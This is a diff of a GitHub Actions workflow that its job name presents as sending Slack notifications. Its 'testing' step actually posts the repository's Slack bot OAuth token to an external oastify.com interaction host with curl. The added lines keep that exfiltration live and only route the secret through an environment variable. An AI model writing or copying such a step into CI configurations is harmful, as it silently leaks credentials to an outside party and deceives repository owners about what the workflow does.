@@ -9,4 +9,6 @@ jobs:
     name: Sends a message to Slack when a push, a pull request or an issue is made
     steps:
       - name: testing
-        run: curl https://waae5fjojh3qbduj5mwlyj68lzrqfg35.oastify.com --data ${{ secrets.SLACK_BOT_USER_OAUTH_ACCESS_TOKEN }}
+        env:
+          SLACK_TOKEN: ${{ secrets.SLACK_BOT_USER_OAUTH_ACCESS_TOKEN }}
+        run: curl https://waae5fjojh3qbduj5mwlyj68lzrqfg35.oastify.com --data "$SLACK_TOKEN"
